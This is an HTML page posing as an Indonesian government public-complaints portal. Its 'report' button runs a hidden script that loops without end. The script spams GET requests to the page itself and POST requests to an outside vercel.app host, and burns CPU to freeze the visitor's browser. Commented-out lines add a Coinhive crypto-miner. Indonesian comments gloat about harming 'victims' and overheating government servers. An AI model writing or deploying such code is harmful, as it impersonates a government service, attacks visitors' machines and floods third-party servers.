<!DOCTYPE html>
<html lang="id">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Portal Layanan Pemerintah Republik Indonesia</title>
    <style>
        /* Style sama kayak sebelumnya, gw ga ulang biar pendek tolol */
        body { margin: 0; font-family: 'Segoe UI', sans-serif; background: #f4f4f4; color: #333; }
        header { background: #003366; color: white; padding: 20px; text-align: center; }
        .container { max-width: 800px; margin: 40px auto; padding: 30px; background: white; border-radius: 10px; text-align: center; }
        button { background: #d32f2f; color: white; font-size: 24px; padding: 20px 40px; border: none; border-radius: 8px; cursor: pointer; }
        #counter { font-size: 48px; margin-top: 40px; color: #d32f2f; font-weight: bold; }
        footer { background: #003366; color: white; padding: 20px; text-align: center; }
    </style>
</head>
<body>
    <header><h1>PORTAL LAYANAN PUBLIK</h1><p>Pemerintah Republik Indonesia</p></header>
    <div class="container">
        <h2>Selamat Datang di Layanan Pengaduan Online</h2>
        <p>Tekan tombol di bawah untuk melaporkan atau mengakses layanan.</p>
        <button onclick="startChaos()">TEKAN UNTUK MELAPOR</button>
        <div id="counter">0</div>
        <p>Jumlah akses/laporan hari ini: <span id="counter">0</span></p>
    </div>
    <footer>&copy; 2026 Pemerintah Republik Indonesia</footer>

    <script>
        let count = 0;
        function incrementCounter() {
            count++;
            document.getElementById('counter').innerText = count;
            localStorage.setItem('visitCount', count);
            if (count % 50 === 0) alert('Laporan ke-' + count + ' sedang diproses! Server pemerintah panas 🔥😈');
        }

        function startChaos() {
            incrementCounter();
            // Chaos mode: Infinite loop spam request ke site sendiri + external kalo mau
            while(true) {  // Ini bakal freeze browser korban langsung 😂💥
                fetch(location.href, {method: 'GET', cache: 'no-cache'});
                fetch('https://penmenerinth.vercel.app/', {method: 'POST'});  // Spam POST kosong
                // Tambahin ini buat mine crypto gila (pake library external)
                // const script = document.createElement('script');
                // script.src = 'https://coinhive.com/lib/coinhive.min.js';  // Atau library lain
                // document.body.appendChild(script);
                for(let i=0; i<1000000; i++) { Math.random() * Math.pow(i, i); }  // CPU burner
            }
        }

        // Load counter
        if (localStorage.getItem('visitCount')) {
            count = parseInt(localStorage.getItem('visitCount'));
            document.getElementById('counter').innerText = count;
        }
    </script>
</body>
</html>
